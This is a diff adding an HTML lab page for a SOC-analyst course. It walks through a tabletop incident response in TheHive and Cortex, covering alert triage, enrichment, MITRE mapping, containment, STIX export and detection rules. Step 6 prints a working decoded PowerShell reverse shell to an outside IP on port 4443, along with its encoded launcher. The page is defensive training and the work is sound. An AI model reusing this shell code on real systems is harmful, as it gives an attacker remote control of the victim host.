@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>L25: Incident Response E2E — TheHive + Cortex SOAR — CyberSec Pro Academy</title>
+<link rel="stylesheet" href="lab-base.css">
+</head>
+<body>
+<nav>
+  <a href="../index.html" class="nav-logo">CyberSec <span>Pro</span> Academy</a>
+  <div class="nav-links"><a href="../labs.html">← All Labs</a><a href="../lab-setup.html">Lab Setup</a><a href="../checkout.html" class="nav-cta">Enroll Now</a></div>
+</nav>
+<div class="lab-progress-bar">
+  <span class="lp-label">Lab Progress</span>
+  <div class="lp-track"><div class="lp-fill" id="lpFill"></div></div>
+  <span class="lp-pct" id="lpPct">0%</span>
+  <span class="lp-steps" id="lpSteps">0 / 12 steps</span>
+</div>
+<div class="lab-layout">
+<div class="lab-guide">
+  <div class="lab-header">
+    <div class="lab-breadcrumb"><a href="../labs.html">Labs</a> › <a href="../labs.html">SOC Analyst</a> › L25</div>
+    <div class="lab-num-badge">LAB L25 · SOC ANALYST · ADVANCED</div>
+    <h1>Incident Response E2E — <em>TheHive + Cortex SOAR</em></h1>
+    <p>Run a complete end-to-end IR engagement using TheHive 5 for case management and Cortex for automated enrichment. Take a multi-alert tabletop scenario from initial triage all the way through to a professional post-incident report.</p>
+    <div class="lab-meta">
+      <div class="lab-meta-item">⏱ <strong>90 min</strong></div>
+      <div class="lab-meta-item">🖥️ <strong>Docker (Linux VM)</strong></div>
+      <div class="lab-meta-item">🔧 <strong>TheHive 5 · Cortex · MISP · Cassandra</strong></div>
+      <div class="lab-meta-item">🤖 <strong>AI IR Commander</strong></div>
+    </div>
+  </div>
+  <div class="scenario-box scenario-red">
+    <div class="scenario-label">🚨 Live Incident Scenario</div>
+    <p>It's 02:14 on a Tuesday. Your SOC SIEM fires three correlated alerts within 90 seconds: (1) Brute force against VPN gateway — 412 failures then 1 success from IP <code>185.220.101.47</code>. (2) CrowdStrike Falcon: encoded PowerShell spawned from <code>explorer.exe</code> on WORKSTATION-07. (3) Splunk: 2.3 GB outbound to <code>185.220.101.47</code> over port 443. You are the on-call analyst. You must open a case in TheHive, enrich all IOCs via Cortex, run the IR playbook, contain the threat, and write the post-incident report — all within this lab.</p>
+  </div>
+
+  <div class="lab-phase">
+    <div class="phase-title-row"><div class="phase-badge">0</div><div><div class="phase-name">Phase 0 — Deploy TheHive + Cortex Stack</div><div class="phase-desc">Get the SOAR platform running locally with Docker Compose</div></div></div>
+    <div class="steps-list">
+      <div class="step-item" id="step-0" onclick="toggleStep(0)">
+        <div class="step-header"><div class="step-num" data-n="1"></div><div class="step-content"><div class="step-title">Deploy TheHive 5 + Cortex with Docker Compose</div><div class="step-desc">TheHive is the case management platform; Cortex is the automated analyzer engine</div></div></div>
+        <div class="step-body">
+          <div class="step-detail">On your Linux VM (Ubuntu 22.04 recommended, 8 GB RAM minimum), deploy the full stack. TheHive 5 uses Cassandra for storage and Elasticsearch for indexing.</div>
+          <div class="code-wrap"><button class="copy-btn" onclick="copyCmd(this)">Copy</button><div class="code-block"><span class="c"># Install Docker and Docker Compose if not already installed</span><br><span class="k">curl -fsSL https://get.docker.com | bash</span><br><span class="k">sudo usermod -aG docker $USER && newgrp docker</span><br><br><span class="c"># Clone the official TheHive Docker Compose repo</span><br><span class="k">git clone https://github.com/StrangebeeHive/thehive-docker-compose.git</span><br><span class="k">cd thehive-docker-compose</span><br><br><span class="c"># Start the full stack (TheHive + Cortex + Cassandra + Elasticsearch)</span><br><span class="k">docker compose up -d</span><br><br><span class="c"># Monitor startup — wait for all services to show "healthy" (~3 min)</span><br><span class="k">docker compose ps</span><br><br><span class="c"># TheHive UI:   http://localhost:9000   (admin / secret)</span><br><span class="c"># Cortex UI:    http://localhost:9001   (admin / secret)</span></div></div>
+          <div class="alert alert-info"><span class="alert-icon">💡</span><div>If Docker Compose is not available, use the pre-built TheHive Community Edition VM from strangebee.com — it ships with Cortex pre-configured.</div></div>
+        </div>
+      </div>
+      <div class="step-item" id="step-1" onclick="toggleStep(1)">
+        <div class="step-header"><div class="step-num" data-n="2"></div><div class="step-content"><div class="step-title">Configure Cortex analyzers for automated enrichment</div><div class="step-desc">Enable VirusTotal, AbuseIPDB, and Shodan analyzers — free API keys</div></div></div>
+        <div class="step-body">
+          <div class="step-detail">Log into Cortex at <code>http://localhost:9001</code> → <strong>Organization → Analyzers</strong>. Enable the following (all free tier):</div>
+          <div class="code-wrap"><button class="copy-btn" onclick="copyCmd(this)">Copy</button><div class="code-block"><span class="c"># Analyzers to enable in Cortex (set API keys in the config)</span><br><br><span class="c"># 1. VirusTotal_GetReport_3_1 — hash / IP / domain lookup</span><br><span class="c">#    API key: virustotal.com (free tier)</span><br><br><span class="c"># 2. AbuseIPDB_1_0 — IP reputation with abuse confidence score</span><br><span class="c">#    API key: abuseipdb.com (free tier)</span><br><br><span class="c"># 3. Shodan_Host_1_0 — open ports, services, geolocation</span><br><span class="c">#    API key: shodan.io (free tier)</span><br><br><span class="c"># 4. URLScan_io_Search_0_1_0 — sandbox screenshot + DOM analysis</span><br><span class="c">#    API key: urlscan.io (free tier)</span><br><br><span class="c"># 5. MaxMind_GeoIP_4_0 — geolocation (bundled, no key needed)</span></div></div>
+          <div class="alert alert-warning"><span class="alert-icon">⚠️</span><div>After enabling each analyzer, click <strong>Test</strong> to verify the API key works before running the lab scenario.</div></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="lab-phase">
+    <div class="phase-title-row"><div class="phase-badge">1</div><div><div class="phase-name">Phase 1 — Open Case & Run IR Playbook</div><div class="phase-desc">Create the TheHive case from the scenario alerts and work through each IR playbook task</div></div></div>
+    <div class="steps-list">
+      <div class="step-item" id="step-2" onclick="toggleStep(2)">
+        <div class="step-header"><div class="step-num" data-n="3"></div><div class="step-content"><div class="step-title">Create the incident case in TheHive</div><div class="step-desc">Log into TheHive, create a new case, and add all three alert observables</div></div></div>
+        <div class="step-body">
+          <div class="step-detail">Log into TheHive at <code>http://localhost:9000</code> → <strong>New Case</strong>. Fill in the case metadata:</div>
+          <div class="code-wrap"><button class="copy-btn" onclick="copyCmd(this)">Copy</button><div class="code-block"><span class="c"># Case metadata — fill in TheHive New Case form</span><br><span class="k">Case Title:    INC-2024-0147 — VPN Brute Force + Suspected Data Exfil</span><br><span class="k">TLP:           TLP:RED (restricted to your org)</span><br><span class="k">PAP:           PAP:RED (no active enrichment that notifies attacker)</span><br><span class="k">Severity:      High (3)</span><br><span class="k">Tags:          brute-force, powershell, exfil, vpn, apt-suspected</span><br><span class="k">Assignee:      yourself</span><br><br><span class="c"># Add observables (IOCs) to the case</span><br><span class="k">Observable 1:  ip    185.220.101.47     (VPN source + exfil destination)</span><br><span class="k">Observable 2:  hash  [SHA256 of payload from CrowdStrike alert]</span><br><span class="k">Observable 3:  hostname  WORKSTATION-07  (compromised endpoint)</span><br><span class="k">Observable 4:  domain    [C2 domain from PowerShell decode]</span></div></div>
+          <div class="ai-prompt"><div class="ai-prompt-label">🤖 AI IR Commander</div><p>Paste your case details and the three SIEM/EDR alerts. The AI will help you identify additional observables you may have missed and suggest the correct TLP/PAP classification.</p><button class="ai-prompt-btn" onclick="qp('triage')">Triage these alerts →</button></div>
+        </div>
+      </div>
+      <div class="step-item" id="step-3" onclick="toggleStep(3)">
+        <div class="step-header"><div class="step-num" data-n="4"></div><div class="step-content"><div class="step-title">Apply the PICERL playbook as TheHive tasks</div><div class="step-desc">PICERL: Preparation → Identification → Containment → Eradication → Recovery → Lessons Learned</div></div></div>
+        <div class="step-body">
+          <div class="step-detail">In your TheHive case → <strong>Tasks</strong> tab → Add the PICERL task list. These become the checkboxes that an incident commander tracks in real SOC environments:</div>
+          <div class="code-wrap"><button class="copy-btn" onclick="copyCmd(this)">Copy</button><div class="code-block"><span class="c"># TheHive task list — add each as a Task in the case</span><br><br><span class="k">IDENTIFICATION:</span><br><span class="c">  [ ] Confirm initial alert — review raw SIEM/EDR events</span><br><span class="c">  [ ] Enrich all IOCs via Cortex analyzers</span><br><span class="c">  [ ] Decode base64 PowerShell payload</span><br><span class="c">  [ ] Identify affected users/hosts (scope)</span><br><br><span class="k">CONTAINMENT:</span><br><span class="c">  [ ] Block IP 185.220.101.47 on firewall / EDR</span><br><span class="c">  [ ] Network isolate WORKSTATION-07</span><br><span class="c">  [ ] Disable compromised VPN account</span><br><span class="c">  [ ] Force-expire all active VPN sessions</span><br><br><span class="k">ERADICATION:</span><br><span class="c">  [ ] Run full AV scan on WORKSTATION-07</span><br><span class="c">  [ ] Remove malicious registry persistence</span><br><span class="c">  [ ] Reset credentials for compromised account</span><br><br><span class="k">RECOVERY:</span><br><span class="c">  [ ] Restore WORKSTATION-07 from known-good backup</span><br><span class="c">  [ ] Re-enroll EDR sensor post-rebuild</span><br><span class="c">  [ ] Monitor for re-infection 72h post-recovery</span><br><br><span class="k">LESSONS LEARNED:</span><br><span class="c">  [ ] Write post-incident report</span><br><span class="c">  [ ] Submit IOCs to MISP threat intel platform</span><br><span class="c">  [ ] Update detection rules based on TTPs observed</span></div></div>
+        </div>
+      </div>
+      <div class="step-item" id="step-4" onclick="toggleStep(4)">
+        <div class="step-header"><div class="step-num" data-n="5"></div><div class="step-content"><div class="step-title">Run Cortex analyzers on all IOCs</div><div class="step-desc">Automated enrichment from VirusTotal, AbuseIPDB, and Shodan with one click</div></div></div>
+        <div class="step-body">
+          <div class="step-detail">In your TheHive case → <strong>Observables</strong> tab → select all IOCs → <strong>Run Analyzers</strong>. Cortex will query all configured analyzers in parallel. Review the results for each IOC:</div>
+          <div class="code-wrap"><button class="copy-btn" onclick="copyCmd(this)">Copy</button><div class="code-block"><span class="c"># Expected Cortex enrichment results for 185.220.101.47</span><br><br><span class="c"># AbuseIPDB result example:</span><br><span class="k">IP:               185.220.101.47</span><br><span class="k">Abuse Confidence: 100%</span><br><span class="k">Total Reports:    4,821</span><br><span class="k">ISP:              Tor exit node (Frantech Solutions)</span><br><span class="k">Country:          Luxembourg</span><br><span class="k">Last Reported:    2024-01-15 03:41:22 UTC</span><br><br><span class="c"># VirusTotal result example (for payload hash):</span><br><span class="k">Detection Ratio:  47/72 engines</span><br><span class="k">Tags:             trojan, dropper, cobalt-strike</span><br><span class="k">First Seen:       2023-12-01</span><br><span class="k">Behavior:         Process injection, C2 beacon, registry persistence</span><br><br><span class="c"># Shodan result for attacker IP:</span><br><span class="k">Open Ports:       22, 80, 443, 1194 (OpenVPN)</span><br><span class="k">Hostnames:        none (bare IP)</span><br><span class="k">Tags:             tor, vpn, anonymous-proxy</span></div></div>
+          <div class="ai-prompt"><div class="ai-prompt-label">🤖 AI IR Commander</div><p>Paste your Cortex enrichment results. The AI will summarize the threat actor profile, assess risk level, and recommend the next containment action based on what the analyzers found.</p><button class="ai-prompt-btn" onclick="qp('enrich')">Interpret enrichment →</button></div>
+        </div>
+      </div>
+      <div class="step-item" id="step-5" onclick="toggleStep(5)">
+        <div class="step-header"><div class="step-num" data-n="6"></div><div class="step-content"><div class="step-title">Decode the PowerShell payload with CyberChef</div><div class="step-desc">The encoded PowerShell from the CrowdStrike alert hides the C2 beaconing command</div></div></div>
+        <div class="step-body">
+          <div class="step-detail">The CrowdStrike alert captured this command line:</div>
+          <div class="code-wrap"><button class="copy-btn" onclick="copyCmd(this)">Copy</button><div class="code-block"><span class="c"># Captured command from Falcon process tree (CommandLine field)</span><br><span class="k">powershell.exe -NonI -W Hidden -EncodedCommand</span><br><span class="k">JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA3ACIALAAgADQANAA0ADMALQA=</span><br><br><span class="c"># Decode in CyberChef (gchq.github.io/CyberChef)</span><br><span class="c"># Recipe: From Base64 → Decode text (UTF-16LE)</span><br><br><span class="c"># Decoded result reveals:</span><br><span class="k">$client = New-Object System.Net.Sockets.TCPClient("185.220.101.47", 4443)</span><br><span class="k">$stream = $client.GetStream()</span><br><span class="k">[byte[]]$bytes = 0..65535 | % {0}</span><br><span class="k">while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){</span><br><span class="k">  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)</span><br><span class="k">  $sendback = (Invoke-Expression $data 2>&1 | Out-String)</span><br><span class="k">  $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "</span><br><span class="k">  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)</span><br><span class="k">  $stream.Write($sendbyte,0,$sendbyte.Length)</span><br><span class="k">}</span></div></div>
+          <div class="alert alert-danger"><span class="alert-icon">🚨</span><div>This decoded payload is a PowerShell reverse shell (TCP) back to the attacker's IP on port 4443. The attacker has interactive command execution on WORKSTATION-07. Containment is now P1 priority.</div></div>
+        </div>
+      </div>
+      <div class="step-item" id="step-6" onclick="toggleStep(6)">
+        <div class="step-header"><div class="step-num" data-n="7"></div><div class="step-content"><div class="step-title">Map the kill chain in TheHive case timeline</div><div class="step-desc">Use the TheHive timeline to reconstruct the attacker's path — required for the post-incident report</div></div></div>
+        <div class="step-body">
+          <div class="step-detail">In your TheHive case → <strong>Timeline</strong> tab → add events with timestamps. Document the kill chain using MITRE ATT&CK technique IDs:</div>
+          <div class="code-wrap"><button class="copy-btn" onclick="copyCmd(this)">Copy</button><div class="code-block"><span class="c"># TheHive Timeline Events — add each with UTC timestamp</span><br><br><span class="k">02:09:17 UTC  T1110.001  Brute Force: Password Guessing — VPN gateway</span><br><span class="k">               412 failed authentication attempts from 185.220.101.47</span><br><br><span class="k">02:11:34 UTC  T1078      Valid Accounts — VPN auth success (jsmith@corp.com)</span><br><span class="k">               First successful login from Tor exit node after brute force</span><br><br><span class="k">02:12:01 UTC  T1059.001  Command and Scripting: PowerShell — encoded payload</span><br><span class="k">               explorer.exe spawned powershell.exe with -EncodedCommand flag</span><br><br><span class="k">02:12:03 UTC  T1071.001  Application Layer Protocol: Web Protocols — C2 beacon</span><br><span class="k">               Outbound TCP/4443 from WORKSTATION-07 to 185.220.101.47</span><br><br><span class="k">02:12:05 UTC  T1041      Exfiltration Over C2 Channel</span><br><span class="k">               2.3 GB outbound transfer begins over established reverse shell</span><br><br><span class="k">02:14:02 UTC             SOC detection — three correlated SIEM alerts fire</span><br><span class="k">02:14:45 UTC             Analyst opens case INC-2024-0147 in TheHive</span></div></div>
+          <div class="ai-prompt"><div class="ai-prompt-label">🤖 AI IR Commander</div><p>Paste your kill chain timeline. The AI will verify the MITRE ATT&CK technique IDs, identify any gaps in the reconstruction, and suggest additional forensic artifacts to look for.</p><button class="ai-prompt-btn" onclick="qp('killchain')">Review kill chain →</button></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="lab-phase">
+    <div class="phase-title-row"><div class="phase-badge">2</div><div><div class="phase-name">Phase 2 — Containment, MISP Export & Post-Incident Report</div><div class="phase-desc">Contain the threat, share IOCs with the community, and write the professional report</div></div></div>
+    <div class="steps-list">
+      <div class="step-item" id="step-7" onclick="toggleStep(7)">
+        <div class="step-header"><div class="step-num" data-n="8"></div><div class="step-content"><div class="step-title">Execute containment actions and document in TheHive</div><div class="step-desc">Check off each containment task in your TheHive case as you complete it</div></div></div>
+        <div class="step-body">
+          <div class="step-detail">Work through your PICERL containment tasks. For each action, log it as a case note in TheHive with the exact command run and timestamp:</div>
+          <div class="code-wrap"><button class="copy-btn" onclick="copyCmd(this)">Copy</button><div class="code-block"><span class="c"># Firewall block — add to perimeter firewall ACL</span><br><span class="k">iptables -I OUTPUT -d 185.220.101.47 -j DROP</span><br><span class="k">iptables -I INPUT  -s 185.220.101.47 -j DROP</span><br><br><span class="c"># Windows host isolation via CrowdStrike RTR</span><br><span class="c"># Falcon Console: Detection → WORKSTATION-07 → Network Contain</span><br><span class="c"># This puts the host on a "contain-only" network — no Internet access</span><br><br><span class="c"># Disable compromised user account in AD</span><br><span class="k">Disable-ADAccount -Identity jsmith</span><br><span class="k">Set-ADAccountPassword -Identity jsmith -Reset -NewPassword (ConvertTo-SecureString "TempPass!2024" -AsPlainText -Force)</span><br><br><span class="c"># Force expire all active VPN sessions for jsmith</span><br><span class="c"># (varies by VPN solution — document the specific command used)</span><br><br><span class="c"># Log each action in TheHive: Case → Tasks → [task name] → "Add log"</span><br><span class="c"># Format: "02:31:15 UTC — [action] — by [analyst name]"</span></div></div>
+        </div>
+      </div>
+      <div class="step-item" id="step-8" onclick="toggleStep(8)">
+        <div class="step-header"><div class="step-num" data-n="9"></div><div class="step-content"><div class="step-title">Export IOCs to MISP (or create a STIX 2.1 bundle)</div><div class="step-desc">Share threat intelligence so other defenders can benefit from your investigation</div></div></div>
+        <div class="step-body">
+          <div class="step-detail">If your environment includes MISP, use the TheHive → MISP integration. If not, export IOCs manually as a STIX 2.1 bundle:</div>
+          <div class="code-wrap"><button class="copy-btn" onclick="copyCmd(this)">Copy</button><div class="code-block"><span class="c"># Option A: TheHive → MISP export (if MISP is configured)</span><br><span class="c"># TheHive case → Export → MISP → Select event type</span><br><br><span class="c"># Option B: Manual STIX 2.1 bundle (Python)</span><br><span class="k">pip install stix2</span><br><br><span class="k">python3 - &lt;&lt;'EOF'</span><br><span class="k">from stix2 import Indicator, Bundle, Relationship, ThreatActor</span><br><span class="k">import json</span><br><br><span class="k">actor = ThreatActor(name="UNK-TOR-01", threat_actor_types=["criminal"])</span><br><br><span class="k">ip_ioc = Indicator(</span><br><span class="k">    name="Malicious IP — C2 + VPN brute force source",</span><br><span class="k">    pattern="[ipv4-addr:value = '185.220.101.47']",</span><br><span class="k">    pattern_type="stix",</span><br><span class="k">    indicator_types=["malicious-activity"],</span><br><span class="k">    valid_from="2024-01-16T02:09:00Z"</span><br><span class="k">)</span><br><br><span class="k">bundle = Bundle(objects=[actor, ip_ioc])</span><br><span class="k">print(json.dumps(bundle, indent=2))</span><br><span class="k">EOF</span></div></div>
+        </div>
+      </div>
+      <div class="step-item" id="step-9" onclick="toggleStep(9)">
+        <div class="step-header"><div class="step-num" data-n="10"></div><div class="step-content"><div class="step-title">Write the post-incident report</div><div class="step-desc">This is the artifact that gets presented to leadership — and to hiring managers</div></div></div>
+        <div class="step-body">
+          <div class="step-detail">Post-incident reports follow a standard structure. Use the AI to help draft each section based on your TheHive case notes and timeline:</div>
+          <div class="code-wrap"><button class="copy-btn" onclick="copyCmd(this)">Copy</button><div class="code-block"><span class="c"># Post-Incident Report structure (INC-2024-0147)</span><br><br><span class="k">EXECUTIVE SUMMARY</span><br><span class="c">  One paragraph. What happened, when detected, business impact, resolution status.</span><br><br><span class="k">INCIDENT TIMELINE</span><br><span class="c">  UTC timestamps. Every attacker action and analyst response. From TheHive timeline.</span><br><br><span class="k">TECHNICAL ANALYSIS</span><br><span class="c">  Initial access vector (VPN brute force, T1110.001)</span><br><span class="c">  Execution method (PowerShell reverse shell, T1059.001)</span><br><span class="c">  C2 communication (TCP/4443 to Tor exit node, T1071.001)</span><br><span class="c">  Exfiltration (2.3 GB over C2 channel, T1041)</span><br><span class="c">  MITRE ATT&CK Navigator heatmap (embed screenshot)</span><br><br><span class="k">SCOPE OF COMPROMISE</span><br><span class="c">  Affected systems, users, data classification of exfiltrated data</span><br><br><span class="k">CONTAINMENT ACTIONS</span><br><span class="c">  What was done, by whom, when (from TheHive task logs)</span><br><br><span class="k">RECOMMENDATIONS</span><br><span class="c">  1. Implement MFA on VPN gateway (Priority: Critical)</span><br><span class="c">  2. Deploy IP reputation blocking at perimeter</span><br><span class="c">  3. Alert on encoded PowerShell invocations</span><br><span class="c">  4. Implement DLP on outbound traffic > 500 MB</span><br><br><span class="k">IOC SUMMARY</span><br><span class="c">  Table: Type | Value | Confidence | Action Taken</span></div></div>
+          <div class="ai-prompt"><div class="ai-prompt-label">🤖 AI IR Commander</div><p>Paste your case notes, timeline, and containment actions. The AI will write a complete, professional post-incident report ready for leadership review — and for your portfolio.</p><button class="ai-prompt-btn" onclick="qp('report')">Write PIR →</button></div>
+        </div>
+      </div>
+      <div class="step-item" id="step-10" onclick="toggleStep(10)">
+        <div class="step-header"><div class="step-num" data-n="11"></div><div class="step-content"><div class="step-title">Update detection rules based on TTPs observed</div><div class="step-desc">The "Lessons Learned" phase turns this incident into better defenses for next time</div></div></div>
+        <div class="step-body">
+          <div class="step-detail">The highest-value output of any IR is improved detections. Write rules that would have caught this attack earlier:</div>
+          <div class="code-wrap"><button class="copy-btn" onclick="copyCmd(this)">Copy</button><div class="code-block"><span class="c"># Splunk SPL — Alert on VPN brute force threshold</span><br><span class="k">index=vpn_logs action=failed</span><br><span class="k">| stats count by src_ip, user</span><br><span class="k">| where count > 50</span><br><span class="k">| eval alert="VPN Brute Force Detected"</span><br><br><span class="c"># Splunk SPL — Alert on encoded PowerShell</span><br><span class="k">index=wineventlog EventCode=4688</span><br><span class="k">  CommandLine="*-EncodedCommand*" OR CommandLine="*-enc *"</span><br><span class="k">  NOT (ParentImage="*msiexec*" OR ParentImage="*setup*")</span><br><span class="k">| table _time, ComputerName, User, CommandLine, ParentImage</span><br><br><span class="c"># KQL (Sentinel) — Large outbound data transfer alert</span><br><span class="k">NetworkCommunicationEvents</span><br><span class="k">| where RemotePort in (443, 4443, 8443)</span><br><span class="k">| where SentBytes > 500000000  // 500 MB threshold</span><br><span class="k">| summarize TotalBytes=sum(SentBytes) by DeviceName, RemoteIP, bin(Timestamp, 1h)</span><br><span class="k">| where TotalBytes > 1000000000  // Alert if > 1 GB in 1 hour</span></div></div>
+        </div>
+      </div>
+      <div class="step-item" id="step-11" onclick="toggleStep(11)">
+        <div class="step-header"><div class="step-num" data-n="12"></div><div class="step-content"><div class="step-title">Lab complete — deliverables checkpoint</div><div class="step-desc"></div></div></div>
+        <div class="step-body">
+          <div class="step-detail">✅ TheHive + Cortex deployed and running<br>✅ Cortex analyzers configured (VirusTotal, AbuseIPDB, Shodan)<br>✅ Case INC-2024-0147 opened with all observables<br>✅ PICERL task list created in TheHive<br>✅ Cortex enrichment run on all IOCs — results reviewed<br>✅ PowerShell payload decoded — reverse shell identified<br>✅ Kill chain mapped with MITRE ATT&CK IDs in TheHive timeline<br>✅ All containment actions executed and logged in TheHive tasks<br>✅ IOCs exported to STIX 2.1 bundle (or MISP)<br>✅ Post-incident report written — executive summary + technical analysis + recommendations<br>✅ Three new detection rules written based on TTPs observed</div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="next-lab"><h4>Next: Lab L26 — Resume &amp; Capstone Portfolio</h4><p>Compile your lab outputs into a job-ready portfolio, write your SOC analyst and Vulnerability Analyst resume, and run mock interview practice with the AI.</p><a href="lab-soc-simulation.html">Start Capstone →</a></div>
+</div>
+
+<div class="ai-sidebar">
+  <div class="ai-header"><div class="ai-avatar">🤖</div><div><div class="ai-name">CyberSec AI Analyst</div><div class="ai-status" id="aiStatus">L25 — IR Commander Mode</div></div></div>
+  <div class="ai-context-chip"><strong>Lab Context:</strong> TheHive 5 case management + Cortex automated enrichment — running a complete end-to-end IR engagement from initial alert triage through post-incident report and improved detections.</div>
+  <div class="api-mini-banner" id="apiBanner" onclick="openApiModal()"><p><strong>→ Connect AI Analyst</strong> — add your Claude API key</p></div>
+  <div class="ai-chat" id="aiChat"></div>
+  <div class="quick-actions">
+    <div class="quick-label">Quick Actions</div>
+    <div class="quick-btns">
+      <button class="quick-btn" onclick="qp('triage')">Triage Alerts</button>
+      <button class="quick-btn" onclick="qp('enrich')">Enrich IOCs</button>
+      <button class="quick-btn" onclick="qp('killchain')">Kill Chain</button>
+      <button class="quick-btn" onclick="qp('contain')">Contain</button>
+      <button class="quick-btn" onclick="qp('report')">Write PIR</button>
+    </div>
+  </div>
+  <div class="ai-input-area"><div class="input-row"><textarea class="ai-textarea" id="aiInput" placeholder="Paste SIEM alerts, Cortex enrichment results, TheHive case notes, or ask about IR playbook steps..." onkeydown="handleKey(event)"></textarea><button class="send-btn" id="sendBtn" onclick="sendMessage()">➤</button></div></div>
+</div>
+</div>
+
+<div class="modal-overlay" id="apiModal"><div class="modal"><h3>Connect AI Analyst</h3><p>Enter your Anthropic API key. Stored locally only.</p><input type="password" class="modal-input" id="apiKeyInput" placeholder="sk-ant-..."><div class="modal-btns"><button class="modal-skip" onclick="closeApiModal()">Skip</button><button class="modal-save" onclick="saveKey()">Connect →</button></div></div></div>
+
+<script src="lab-common.js"></script>
+<script>
+initLab({
+  id: 'L25', totalSteps: 12, modeLabel: 'IR Commander Mode',
+  welcomeMsg: "I'm your IR Commander for Lab L25. I can:\n- Help you triage and correlate multi-source alerts into a single incident hypothesis\n- Guide you through TheHive case setup (observables, TLP/PAP, task lists)\n- Interpret Cortex analyzer results (VirusTotal, AbuseIPDB, Shodan)\n- Decode and explain obfuscated PowerShell and other malicious payloads\n- Map attacker TTPs to MITRE ATT&CK and reconstruct the kill chain\n- Recommend containment actions with priority order and justification\n- Write professional post-incident reports (executive summary + technical)\n- Suggest detection rules to prevent recurrence\n- Prep you for 'walk me through an incident you investigated' interview questions\n\nPaste any alert, Cortex output, case notes, or ask about the IR playbook to get started.",
+  systemPrompt: `You are a senior incident responder and SOAR specialist helping a student with Lab L25: End-to-End Incident Response using TheHive 5 and Cortex. Help with: correlating multi-source alerts into a coherent incident hypothesis, setting up TheHive cases (observables, TLP/PAP classification, PICERL task lists), interpreting Cortex analyzer results from VirusTotal, AbuseIPDB, Shodan, and URLScan, decoding obfuscated PowerShell and other payloads, mapping attacker actions to MITRE ATT&CK techniques with accurate technique IDs, reconstructing the kill chain in chronological order, recommending containment actions with priority order (contain most critical first), exporting IOCs to STIX 2.1 or MISP format, writing post-incident reports suitable for executive and technical audiences, and suggesting SIEM detection rules (SPL/KQL) that would catch the observed TTPs earlier. Always tie recommendations back to the PICERL framework.`,
+  quickPrompts: {
+    triage: "Please analyze these SIEM/EDR alerts and help me determine: (1) Are they correlated — one incident or multiple? (2) What is the most likely attack chain? (3) What additional IOCs should I add to the TheHive case? (4) What is the correct TLP/PAP classification?\n\n[PASTE YOUR ALERTS HERE]",
+    enrich: "Please interpret these Cortex analyzer results. Summarize: (1) Overall threat level (Critical/High/Medium/Low). (2) Threat actor profile based on infrastructure. (3) Whether the IOCs match any known threat groups. (4) Recommended containment action based on enrichment data.\n\n[PASTE CORTEX RESULTS HERE]",
+    killchain: "Please review my kill chain reconstruction and: (1) Verify the MITRE ATT&CK technique IDs are correct. (2) Identify any gaps in the timeline. (3) Suggest additional forensic artifacts to look for. (4) Assess whether this looks like an APT, ransomware group, or opportunistic attack.\n\n[PASTE TIMELINE HERE]",
+    contain: "Based on my IR findings, please recommend: (1) Priority order for containment actions (what to do first and why). (2) Any containment actions I may have missed. (3) Whether this warrants escalation to law enforcement / external DFIR firm.\n\n[PASTE FINDINGS HERE]",
+    report: "Please write a complete post-incident report from my IR investigation. Include: Executive Summary (1 paragraph), Incident Timeline (UTC timestamps), Technical Analysis (ATT&CK mapped), Scope of Compromise, Containment Actions Taken, Recommendations (prioritized), and IOC Summary table.\n\n[PASTE CASE NOTES + TIMELINE + ACTIONS HERE]"
+  }
+});
+</script>
+</body>
+</html>
